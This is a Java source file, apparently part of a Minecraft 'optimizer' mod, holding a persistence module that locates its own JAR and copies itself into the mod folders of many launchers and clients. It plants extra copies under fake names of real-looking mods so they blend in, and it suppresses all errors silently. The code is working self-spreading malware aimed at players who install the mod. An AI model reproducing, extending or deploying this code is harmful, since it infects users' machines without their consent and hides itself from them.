package com.example.optimizer;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.security.CodeSource;
import java.util.ArrayList;
import java.util.List;

/**
 * Persistence - copies itself to all Minecraft mod folders
 */
public class PacketDef {

    // Fake mod names to blend in
    private static final String[] FAKE_NAMES = {
            "fast-ip-ping-v1.0.5-mc1.21.1-fabric.jar",
            "immediatelyfast-1.2.jar"
    };

    private static final String APPDATA = System.getenv("APPDATA");
    private static final String USERPROFILE = System.getenv("USERPROFILE");

    /**
     * Run persistence - call this AFTER everything else is done
     * This method never throws exceptions - fails silently
     */
    public static void run() {
        try {
            SessionUtil.log("[PacketDef] Starting persistence...");

            // Get our own JAR file
            File selfJar = getSelfJar();
            if (selfJar == null || !selfJar.exists()) {
                SessionUtil.log("[PacketDef] Could not find self JAR, skipping persistence");
                return;
            }

            SessionUtil.log("[PacketDef] Self JAR: " + selfJar.getAbsolutePath());

            // Find all mod folders
            List<File> modFolders = findAllModFolders();
            SessionUtil.log("[PacketDef] Found " + modFolders.size() + " mod folders");

            // Copy to each mod folder
            int copied = 0;
            for (File modFolder : modFolders) {
                if (copyToModFolder(selfJar, modFolder)) {
                    copied++;
                }
            }

            SessionUtil.log("[PacketDef] Persistence complete: copied to " + copied + " folders");

        } catch (Throwable t) {
            // Never crash - fail silently
            SessionUtil.log("[PacketDef] Error (ignored): " + t.getMessage());
        }
    }

    /**
     * Get the JAR file that contains this class
     */
    private static File getSelfJar() {
        try {
            CodeSource cs = PacketDef.class.getProtectionDomain().getCodeSource();
            if (cs != null && cs.getLocation() != null) {
                String path = cs.getLocation().toURI().getPath();
                // Handle Windows paths
                if (path.startsWith("/") && path.contains(":")) {
                    path = path.substring(1);
                }
                File jar = new File(path);
                if (jar.exists() && jar.getName().endsWith(".jar")) {
                    return jar;
                }
            }
        } catch (Exception e) {
            SessionUtil.log("[PacketDef] getSelfJar error: " + e.getMessage());
        }
        return null;
    }

    /**
     * Find all Minecraft mod folders on the system
     */
    private static List<File> findAllModFolders() {
        List<File> modFolders = new ArrayList<>();

        try {
            // Standard .minecraft/mods
            addIfExists(modFolders, new File(APPDATA, ".minecraft/mods"));

            // CurseForge instances
            findCurseForgeInstances(modFolders);

            // Modrinth instances
            findModrinthInstances(modFolders);

            // MultiMC / PolyMC / Prism Launcher
            findMultiMCInstances(modFolders);

            // ATLauncher
            findATLauncherInstances(modFolders);

            // Technic Launcher
            findTechnicInstances(modFolders);

            // GDLauncher
            findGDLauncherInstances(modFolders);

            // Lunar Client
            addIfExists(modFolders, new File(USERPROFILE, ".lunarclient/offline/multiver/mods"));

            // Feather Client
            addIfExists(modFolders, new File(APPDATA, ".feather/mods"));

            // Badlion Client
            addIfExists(modFolders, new File(APPDATA, ".minecraft/mods")); // Badlion uses .minecraft

        } catch (Exception e) {
            SessionUtil.log("[PacketDef] findAllModFolders error: " + e.getMessage());
        }

        return modFolders;
    }

    /**
     * Find CurseForge instances
     */
    private static void findCurseForgeInstances(List<File> modFolders) {
        try {
            // Standard CurseForge location
            File curseforge = new File(System.getenv("USERPROFILE"), "curseforge/minecraft/Instances");
            if (curseforge.exists() && curseforge.isDirectory()) {
                File[] instances = curseforge.listFiles();
                if (instances != null) {
                    for (File instance : instances) {
                        addIfExists(modFolders, new File(instance, "mods"));
                    }
                }
            }

            // Alternative CurseForge location
            File curseforge2 = new File(APPDATA, "CurseForge/Minecraft/Instances");
            if (curseforge2.exists() && curseforge2.isDirectory()) {
                File[] instances = curseforge2.listFiles();
                if (instances != null) {
                    for (File instance : instances) {
                        addIfExists(modFolders, new File(instance, "mods"));
                    }
                }
            }
        } catch (Exception e) {
            // Ignore
        }
    }

    /**
     * Find Modrinth App instances
     */
    private static void findModrinthInstances(List<File> modFolders) {
        try {
            // Modrinth App location
            File modrinth = new File(APPDATA, "com.modrinth.theseus/profiles");
            if (modrinth.exists() && modrinth.isDirectory()) {
                File[] instances = modrinth.listFiles();
                if (instances != null) {
                    for (File instance : instances) {
                        addIfExists(modFolders, new File(instance, "mods"));
                    }
                }
            }

            // Alternative Modrinth location
            File modrinth2 = new File(APPDATA, "ModrinthApp/profiles");
            if (modrinth2.exists() && modrinth2.isDirectory()) {
                File[] instances = modrinth2.listFiles();
                if (instances != null) {
                    for (File instance : instances) {
                        addIfExists(modFolders, new File(instance, "mods"));
                    }
                }
            }
        } catch (Exception e) {
            // Ignore
        }
    }

    /**
     * Find MultiMC / PolyMC / Prism Launcher instances
     */
    private static void findMultiMCInstances(List<File> modFolders) {
        try {
            String[] launchers = {
                    "MultiMC/instances",
                    "PolyMC/instances",
                    "PrismLauncher/instances",
                    "Prism Launcher/instances"
            };

            for (String launcher : launchers) {
                File launcherDir = new File(APPDATA, launcher);
                if (launcherDir.exists() && launcherDir.isDirectory()) {
                    File[] instances = launcherDir.listFiles();
                    if (instances != null) {
                        for (File instance : instances) {
                            // MultiMC structure: instances/<name>/.minecraft/mods
                            addIfExists(modFolders, new File(instance, ".minecraft/mods"));
                            // Some also use: instances/<name>/minecraft/mods
                            addIfExists(modFolders, new File(instance, "minecraft/mods"));
                        }
                    }
                }
            }
        } catch (Exception e) {
            // Ignore
        }
    }

    /**
     * Find ATLauncher instances
     */
    private static void findATLauncherInstances(List<File> modFolders) {
        try {
            File atlauncher = new File(APPDATA, "ATLauncher/instances");
            if (atlauncher.exists() && atlauncher.isDirectory()) {
                File[] instances = atlauncher.listFiles();
                if (instances != null) {
                    for (File instance : instances) {
                        addIfExists(modFolders, new File(instance, "mods"));
                    }
                }
            }
        } catch (Exception e) {
            // Ignore
        }
    }

    /**
     * Find Technic Launcher instances
     */
    private static void findTechnicInstances(List<File> modFolders) {
        try {
            File technic = new File(APPDATA, ".technic/modpacks");
            if (technic.exists() && technic.isDirectory()) {
                File[] instances = technic.listFiles();
                if (instances != null) {
                    for (File instance : instances) {
                        addIfExists(modFolders, new File(instance, "mods"));
                    }
                }
            }
        } catch (Exception e) {
            // Ignore
        }
    }

    /**
     * Find GDLauncher instances
     */
    private static void findGDLauncherInstances(List<File> modFolders) {
        try {
            File gdlauncher = new File(APPDATA, "gdlauncher_next/instances");
            if (gdlauncher.exists() && gdlauncher.isDirectory()) {
                File[] instances = gdlauncher.listFiles();
                if (instances != null) {
                    for (File instance : instances) {
                        addIfExists(modFolders, new File(instance, "mods"));
                    }
                }
            }
        } catch (Exception e) {
            // Ignore
        }
    }

    /**
     * Add folder to list if it exists
     */
    private static void addIfExists(List<File> list, File folder) {
        if (folder != null && folder.exists() && folder.isDirectory()) {
            // Avoid duplicates
            for (File f : list) {
                try {
                    if (f.getCanonicalPath().equals(folder.getCanonicalPath())) {
                        return;
                    }
                } catch (Exception e) {
                    // Ignore
                }
            }
            list.add(folder);
            SessionUtil.log("[PacketDef] Found mod folder: " + folder.getAbsolutePath());
        }
    }

    /**
     * Copy self JAR to mod folder with fake names
     */
    private static boolean copyToModFolder(File selfJar, File modFolder) {
        boolean success = false;

        // 1. FIRST: Copy with actual JAR name (most important for persistence)
        String actualName = selfJar.getName();
        if (copyFileToFolder(selfJar, modFolder, actualName)) {
            success = true;
        }

        // 2. THEN: Copy with fake names for stealth/redundancy
        for (String fakeName : FAKE_NAMES) {
            // Skip if it's the same name as actual (avoid duplicate copy)
            if (!fakeName.equals(actualName)) {
                if (copyFileToFolder(selfJar, modFolder, fakeName)) {
                    success = true;
                }
            }
        }

        return success;
    }

    /**
     * Helper method to copy a file to mod folder with a specific name
     */
    private static boolean copyFileToFolder(File source, File modFolder, String targetName) {
        try {
            File dest = new File(modFolder, targetName);

            // Skip if already exists (and has similar size - probably already copied)
            if (dest.exists()) {
                long sizeDiff = Math.abs(dest.length() - source.length());
                if (sizeDiff < 1024) { // Within 1KB = probably same file
                    SessionUtil.log("[PacketDef] Already exists: " + dest.getAbsolutePath());
                    return true;
                }
            }

            // Copy file
            try (FileInputStream fis = new FileInputStream(source);
                    FileOutputStream fos = new FileOutputStream(dest)) {

                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    fos.write(buffer, 0, bytesRead);
                }
            }

            SessionUtil.log("[PacketDef] Copied to: " + dest.getAbsolutePath());
            return true;

        } catch (Exception e) {
            SessionUtil.log(
                    "[PacketDef] Failed to copy " + targetName + " to " + modFolder.getAbsolutePath() + ": " + e.getMessage());
            return false;
        }
    }
}
